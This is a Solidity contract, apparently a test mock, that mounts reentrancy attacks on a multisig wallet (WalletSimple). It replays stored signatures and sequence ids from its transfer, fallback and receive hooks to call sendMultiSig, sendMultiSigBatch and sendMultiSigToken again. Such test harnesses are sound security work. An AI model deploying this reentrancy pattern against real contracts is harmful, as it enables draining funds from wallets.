// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8;

import '../WalletSimple.sol';

contract ReentryWalletSimple {
  WalletSimple private wallet;
  address private toAddress;
  address private tokenContractAddress;
  uint256 private expireTime;
  uint256 private sequenceId;
  uint256 private value;
  bytes private signature;
  bytes private data;
  bool private reentry = false;
  bool private callSendMultiSig = false;
  bool private callSendMultiSigBatch = false;
  address[] private recipients;
  uint256[] private values;

  event Transfer(address from, address to, uint256 value);

  function sendMultiSig(
    address payable _walletAddr,
    address _toAddress,
    uint256 _value,
    bytes calldata _data,
    uint256 _expireTime,
    uint256 _sequenceId,
    bytes calldata _signature,
    bool _reentry
  ) public {
    wallet = WalletSimple(_walletAddr);
    toAddress = _toAddress;
    value = _value;
    data = _data;
    expireTime = _expireTime;
    sequenceId = _sequenceId;
    signature = _signature;
    reentry = _reentry;
    callSendMultiSig = true;
    callSendMultiSigBatch = false;
    (bool success, ) = address(wallet).call(
      abi.encodeWithSignature(
        'sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)',
        toAddress,
        value,
        data,
        expireTime,
        sequenceId,
        signature
      )
    );
    require(success, 'ReentryWalletSimple: sendMultiSig failed call');
  }

  function sendMultiSigBatch(
    address payable _walletAddr,
    address[] calldata _recipients,
    uint256[] calldata _values,
    uint256 _expireTime,
    uint256 _sequenceId,
    bytes calldata _signature,
    bool _reentry
  ) public {
    wallet = WalletSimple(_walletAddr);
    recipients = _recipients;
    values = _values;
    expireTime = _expireTime;
    sequenceId = _sequenceId;
    signature = _signature;
    callSendMultiSig = false;
    callSendMultiSigBatch = true;
    reentry = _reentry;
    (bool success, ) = address(wallet).call(
      abi.encodeWithSignature(
        'sendMultiSigBatch(address[],uint256[],uint256,uint256,bytes)',
        recipients,
        values,
        expireTime,
        sequenceId,
        signature
      )
    );
    require(success, 'ReentryWalletSimple: sendMultiSigBatch failed call');
  }

  function sendMultiSigToken(
    address payable _walletAddr,
    address _toAddress,
    uint256 _value,
    address _tokenContractAddress,
    uint256 _expireTime,
    uint256 _sequenceId,
    bytes calldata _signature,
    bool _reentry
  ) external {
    // Verify the other signer
    wallet = WalletSimple(_walletAddr);
    toAddress = _toAddress;
    value = _value;
    tokenContractAddress = _tokenContractAddress;
    expireTime = _expireTime;
    sequenceId = _sequenceId;
    signature = _signature;
    reentry = _reentry;
    (bool success, ) = address(wallet).call(
      abi.encodeWithSignature(
        'sendMultiSigToken(address,uint256,address,uint256,uint256,bytes)',
        toAddress,
        value,
        tokenContractAddress,
        expireTime,
        sequenceId,
        signature
      )
    );
    require(success, 'ReentryWalletSimple: sendMultiSigToken failed call');
  }

  function transfer(address to, uint256 value) public returns (bool success) {
    if (reentry) {
      (bool success, ) = address(wallet).call(
        abi.encodeWithSignature(
          'sendMultiSigToken(address,uint256,address,uint256,uint256,bytes)',
          toAddress,
          value,
          tokenContractAddress,
          expireTime,
          sequenceId,
          signature
        )
      );
      require(success, 'Attack failed');
    }
    emit Transfer(msg.sender, to, value);
    return true;
  }

  fallback() external payable {
    if (reentry && address(wallet).balance > 0) {
      string memory functionSig;
      if (callSendMultiSig == true) {
        functionSig = 'sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)';
        (bool success, ) = address(wallet).call(
          abi.encodeWithSignature(
            functionSig,
            toAddress,
            value,
            data,
            expireTime,
            sequenceId,
            signature
          )
        );
        require(success, 'Attack failed');
      } else if (callSendMultiSigBatch == true) {
        functionSig = 'sendMultiSigBatch(address[],uint256[],uint256,uint256,bytes)';
        (bool success, ) = address(wallet).call(
          abi.encodeWithSignature(
            functionSig,
            recipients,
            values,
            expireTime,
            sequenceId,
            signature
          )
        );
        require(success, 'Attack failed');
      }
    }
  }

  receive() external payable {
    if (reentry && address(wallet).balance > 0) {
      string memory functionSig;
      if (callSendMultiSig == true) {
        functionSig = 'sendMultiSig(address,uint256,bytes,uint256,uint256,bytes)';
        (bool success, ) = address(wallet).call(
          abi.encodeWithSignature(
            functionSig,
            toAddress,
            value,
            data,
            expireTime,
            sequenceId,
            signature
          )
        );
        require(success, 'Attack failed');
      } else if (callSendMultiSigBatch == true) {
        functionSig = 'sendMultiSigBatch(address[],uint256[],uint256,uint256,bytes)';
        (bool success, ) = address(wallet).call(
          abi.encodeWithSignature(
            functionSig,
            recipients,
            values,
            expireTime,
            sequenceId,
            signature
          )
        );
        require(success, 'Attack failed');
      }
    }
  }
}
